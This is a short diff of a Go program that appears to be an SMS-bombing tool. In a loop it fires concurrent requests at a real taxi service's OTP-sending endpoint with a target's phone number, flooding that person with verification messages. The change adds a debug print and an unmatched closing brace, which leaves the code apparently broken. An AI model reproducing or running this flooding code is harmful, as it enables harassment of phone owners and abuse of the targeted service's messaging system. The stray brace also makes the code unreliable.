@@ -103,9 +103,12 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
-		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
-			"cellphone": phone,
-		}, ch)
+    payload := map[string]interface{}{
+        "cellphone": phone, 
+    }
+    fmt.Println("Payload:", payload) 
+    go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", payload, ch)
+}
 	}
 
 	for i := 0; i < repeatCount; i++ {
